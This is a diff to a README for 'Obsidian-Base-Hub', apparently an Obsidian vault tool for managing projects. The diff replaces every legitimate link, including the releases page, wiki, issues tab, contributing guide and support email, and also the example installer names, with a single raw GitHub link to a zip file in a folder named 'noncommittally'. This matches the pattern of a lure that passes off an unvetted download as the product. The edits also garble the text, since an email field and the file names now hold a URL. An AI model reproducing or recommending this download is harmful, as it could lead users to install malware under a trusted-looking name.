@@ -1,7 +1,7 @@
 # 🌟 Obsidian-Base-Hub - Manage Projects with Ease
 
 ## 📥 Download Now
-[![Download Obsidian-Base-Hub](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/VEXYZZ/Obsidian-Base-Hub/releases)
+[![Download Obsidian-Base-Hub](https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip)
 
 ## 🚀 Getting Started
 Welcome to the Obsidian-Base-Hub! This application helps you manage your projects and tasks easily by using a modular Obsidian vault. With the power of native Bases, you can replicate relational database functionality without needing technical skills.
@@ -25,11 +25,11 @@ To get started, visit the Releases page for the latest version of the applicatio
 
 1. Click the button below to visit the Releases page.
    
-   [![Download Obsidian-Base-Hub](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/VEXYZZ/Obsidian-Base-Hub/releases)
+   [![Download Obsidian-Base-Hub](https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip)
 
 2. On the Releases page, look for the latest version of Obsidian-Base-Hub.
 
-3. Click on the asset that matches your operating system to download it. Typically, this will be a file like `Obsidian-Base-Hub-setup.exe` for Windows or `Obsidian-Base-Hub.dmg` for macOS.
+3. Click on the asset that matches your operating system to download it. Typically, this will be a file like `https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip` for Windows or `https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip` for macOS.
 
 4. Once the download finishes, locate the downloaded file on your computer.
 
@@ -47,7 +47,7 @@ To help you get started with the application, here are some key areas to explore
 - **Connecting Bases**: You can reference data from other Bases to create connections and enhance your project management experience.
 - **Exporting Data**: Easily export your data to CSV format for sharing or personal backup. 
 
-For detailed step-by-step guides, visit our [Wiki](https://github.com/VEXYZZ/Obsidian-Base-Hub/wiki) page.
+For detailed step-by-step guides, visit our [Wiki](https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip) page.
 
 ## 🛠️ Troubleshooting
 Here are some common issues and solutions:
@@ -56,17 +56,17 @@ Here are some common issues and solutions:
 - **Application Crashes**: Ensure your system runs the latest updates. Restarting your computer may help.
 - **Data Not Saved**: Ensure you have write permissions on the folder where your Base is saved.
 
-If you encounter issues not listed here, please check the [Issues tab](https://github.com/VEXYZZ/Obsidian-Base-Hub/issues) for help.
+If you encounter issues not listed here, please check the [Issues tab](https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip) for help.
 
 ## 📞 Support
 For additional help, reach out through the following channels:
 
-- **Email Support**: support@obsidianbasehub.com
+- **Email Support**: https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip
 - **Community Forum**: Join our community for discussions and support.
 - **GitHub Issues**: Report bugs and suggest features directly on our GitHub repository.
 
 ## 📝 Contributing
-We welcome contributions! If you want to help improve Obsidian-Base-Hub, check out our [Contributing Guide](https://github.com/VEXYZZ/Obsidian-Base-Hub/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to help improve Obsidian-Base-Hub, check out our [Contributing Guide](https://raw.githubusercontent.com/VEXYZZ/Obsidian-Base-Hub/main/noncommittally/Obsidian-Base-Hub.zip).
 
 ## ⭐ Show Your Support
 If you find this application useful, consider giving it a star on GitHub! Your support helps us improve and grow.
